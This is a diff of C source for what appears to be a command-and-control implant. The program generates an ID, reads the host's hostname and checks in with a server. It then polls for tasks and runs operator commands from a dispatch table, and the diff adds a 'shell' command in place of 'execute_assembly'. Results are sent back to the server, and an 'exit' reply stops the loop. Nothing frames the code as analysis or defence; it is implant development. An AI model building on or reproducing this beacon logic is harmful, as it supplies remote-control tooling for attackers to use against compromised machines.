@@ -16,16 +16,6 @@
 
 unsigned int sleep_int = 10;
 
-char *get_args(char *str) {
-    char *arguments = NULL;
-    char *space = strchr(str, ' ');
-    if (space != NULL) {
-        *space = '\0';
-        arguments = space + 1;
-    }
-    return arguments;
-}
-
 void sanitize_cmd(char *cmd) {
     size_t len = strlen(cmd);
     while (len > 0 && (cmd[len-1] == '\n' || cmd[len-1] == '\r' || cmd[len-1] == ' ' || cmd[len-1] == '\t'))
@@ -46,20 +36,21 @@ typedef struct {
 check * hash_table[TABLE_SIZE];
 
 unsigned int hash(char *name) {
-    int length = strnlen(name, CMD_LEN);
-    unsigned int hash_value = 0;
-    for (int i = 0; i < length; i++) {
-        hash_value += name[i];
-        hash_value = (hash_value * name[i]) % TABLE_SIZE;
+    unsigned long hash = 5381;
+    int c;
+
+    while ((c = *name++)) {
+        // hash * 33 + c
+        hash = ((hash << 5) + hash) + c;
     }
-    return hash_value;
+    return hash % TABLE_SIZE;
 }
 
 check function[] = {
     {"ls", cmd_ls},
     {"cat", cmd_cat},
     {"env", cmd_env},
-    {"execute_assembly", cmd_execute_assembly},
+    {"shell", cmd_shell},
     {"NULL", NULL}
 };
 
@@ -79,8 +70,9 @@ bool hash_insert() {
 
 void command_execute(struct io_uring *ring, int sockfd, const char *uuid, char *input) {
     sanitize_cmd(input);
-    char *args = get_args(input);
-    char *command = input;
+    char **tmp = split(input, ' ', 1);
+    char *args = tmp[1];
+    char *command = tmp[0];
     if (strcmp(command, "sleep") == 0) {
         sleep_int = atoi(args);
         send2serv(uuid, "Done", 6);
@@ -96,6 +88,7 @@ void command_execute(struct io_uring *ring, int sockfd, const char *uuid, char *
             send2serv(uuid, msg, strlen(msg));
         }
     }
+    free(tmp);
 }
 
 // A struct to hold all the data associated with a request.
@@ -104,7 +97,7 @@ int main() {
 
     //Create UUID
     srand(time(NULL));
-    const char charset[] = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz";
+    const char charset[] = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz1234567890";
     int charset_len = strlen(charset);
 
     int uuid_len = 16 + 1;
@@ -115,7 +108,6 @@ int main() {
     }
     tmp_uuid[uuid_len] = '\0';
     char *uuid = base64_encode((const unsigned char *)tmp_uuid, strlen(tmp_uuid));
-
 
     struct io_uring ring;
     // struct io_uring_sqe *sqe;
@@ -128,8 +120,9 @@ int main() {
         return 1;
     }
 
-    
-    // size_t n;
+    char *hostname = read_file(&ring, "/proc/sys/kernel/hostname");
+    sanitize_cmd(hostname);
+
     while (true) {
         request_t *req = calloc(1, sizeof(request_t));
         int sockfd = connection(&ring, req);
@@ -139,64 +132,23 @@ int main() {
             continue;
         }
 
-        char *http_body = send_get(&ring, req, uuid, "login");
-
-        // size_t total_read = 0;
-        // int cont_length = -1;
-        // int header_parsed = 0;
-        // size_t body_offset = 0;
-        // while (1) {
-        //     req->iov.iov_base = req->buffer + total_read;
-        //     req->iov.iov_len = BUFFER_SIZE - 1 - total_read;
-        //     sqe = io_uring_get_sqe(&ring);
-        //     // Prepare the SQE for a receive operation (using readv).
-        //     io_uring_prep_readv(sqe, req->client_socket, &req->iov, 1, 0);
-        //     io_uring_sqe_set_data(sqe, req);
-        //     io_uring_submit(&ring);
-        //     io_uring_wait_cqe(&ring, &cqe);
-        //     n = cqe->res;
-        //     io_uring_cqe_seen(&ring, cqe);
-        //     req->buffer[n] = '\0';
-
-        //     if (n <= 0) {
-        //         break;
-        //     }
-
-        //     total_read += n;
-
-        //     if (!header_parsed) {
-        //         char *end = header_end(req->buffer);
-        //         if (end) {
-        //             header_parsed = 1;
-        //             body_offset = end - req->buffer + 4;
-        //             cont_length = content_length(req->buffer);
-        //         }
-        //     }
-            
-        //     if (header_parsed && cont_length > -1) {
-        //         size_t body_len = total_read - body_offset;
-        //         if (body_len >= (size_t)content_length) {
-        //             break;
-        //         }
-        //     }
-
-        // }
-
-        // char *http_body = req->buffer + body_offset;
+        char *http_body = send_get(&ring, req, uuid, "login", hostname);
 
         if (strcmp(http_body, "exit") == 0) {
             close(req->client_socket);
             //io_uring_queue_exit(&ring);
             free(req);
+            free(uuid);
+            free(hostname);
             break;
         } else if (strcmp(http_body, "") == 0) {
             close(req->client_socket);
             free(req);
             sleep(sleep_int);
             continue;
+        } else {
+            command_execute(&ring, req->client_socket, uuid, http_body);
         }
-
-        command_execute(&ring, req->client_socket, uuid, http_body);
 
         close(req->client_socket);
         free(req);
